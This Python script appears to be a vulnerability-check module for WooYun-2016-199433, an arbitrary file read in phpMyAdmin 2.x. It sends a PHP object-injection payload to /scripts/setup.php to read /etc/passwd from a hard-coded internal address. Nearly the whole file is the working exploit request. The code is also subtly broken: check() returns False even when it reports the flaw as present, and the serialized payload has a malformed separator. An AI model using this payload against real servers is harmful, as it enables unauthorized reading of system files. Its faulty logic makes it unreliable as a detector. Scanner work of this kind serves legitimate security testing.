#!/usr/bin/python3

from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class WooYun_2016_199433_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'WooYun-2016-199433漏洞',
            'description': 'WooYun-2016-199433漏洞,任意读取文件影响范围为: phpmyadmin 2.x',
            'date': '2016-xx-xx',
            'exptype': 'check',
            'type': 'File Read'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.payload = 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'

    def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            req = request.post(self.url + '/scripts/setup.php', headers = self.headers, data = self.payload)
            if req.status_code == 200 and 'phpMyAdmin' in req.headers['Set-Cookie'] and 'root' in req.text:
                print('存在WooYun-2016-199433漏洞')
                return False
            else:
                print('不存在WooYun-2016-199433漏洞')
                return False
        except Exception as e:
            print(e)
            print('不存在WooYun-2016-199433漏洞')
            return False

if  __name__ == "__main__":
    WooYun_2016_199433 = WooYun_2016_199433_BaseVerify('http://192.168.30.242:8080')
    WooYun_2016_199433.check()

